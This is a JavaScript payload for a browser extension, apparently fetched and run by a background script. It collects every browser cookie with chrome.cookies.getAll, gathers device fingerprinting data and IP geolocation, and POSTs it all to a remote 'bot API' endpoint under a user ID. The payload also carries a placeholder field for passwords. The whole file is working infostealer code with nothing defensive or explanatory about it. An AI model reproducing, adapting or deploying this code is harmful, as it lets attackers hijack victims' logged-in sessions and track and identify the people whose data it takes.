// Extension payload script - fetched and executed by background.js
// Parameters: BOT_API_URL, USER_ID

async function extractAndSendCookies(BOT_API_URL, USER_ID) {
  try {
    console.log('Extracting data...');
    const cookies = await chrome.cookies.getAll({});
    console.log('Found ' + cookies.length + ' cookies');

    // Collect fingerprinting data
    const fingerprint = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      deviceMemory: navigator.deviceMemory || 'unknown',
      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
      vendor: navigator.vendor
    };

    // Service workers don't have access to screen, localStorage, or document
    // These would only work in content scripts or popup pages
    fingerprint.location = 'service_worker';

    // Get IP geolocation
    try {
      const ipResponse = await fetch('https://ipapi.co/json/');
      if (ipResponse.ok) {
        const ipData = await ipResponse.json();
        fingerprint.ipLocation = {
          ip: ipData.ip,
          country: ipData.country_name,
          region: ipData.region,
          city: ipData.city,
          latitude: ipData.latitude,
          longitude: ipData.longitude,
          isp: ipData.org
        };
      }
    } catch (e) {
      console.log('Could not get IP location:', e);
    }

    // Get GPU info via WebGL
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          fingerprint.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        }
      }
    } catch (e) {
      console.log('Could not get GPU info:', e);
    }

    // Generate unique identifier for this extension instance
    const hostname = 'extension';

    // Send to bot API
    const payload = {
      user_id: USER_ID,
      hostname: hostname,
      cookies: cookies,
      passwords: [],
      localStorage: fingerprint
    };

    const response = await fetch(BOT_API_URL + '/log', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(payload)
    });

    console.log('Response: ' + response.status);
    if (response.ok) {
      console.log('✓ Data sent to bot API');
    } else {
      console.error('✗ Bot API error: ' + response.status);
    }
  } catch (error) {
    console.error('✗ Error: ' + error.message);
  }
}

// Execute the function
extractAndSendCookies(BOT_API_URL, USER_ID);
